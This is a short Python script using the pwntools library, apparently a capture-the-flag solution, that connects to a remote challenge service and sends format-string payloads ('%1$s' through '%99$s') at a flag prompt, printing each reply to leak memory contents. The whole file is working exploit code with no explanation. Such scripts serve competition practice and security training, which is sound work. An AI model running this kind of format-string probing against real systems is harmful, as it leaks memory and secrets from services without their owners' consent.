from pwn import *


for i in range(100):
    try:
        # p = process('./abyss-dist')
        
        p = remote('0.cloud.chals.io', 27147, level='error')
        p.sendlineafter(b'flag: ', '%{}$s'.format(i).encode())
        result = p.recv(1024)
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass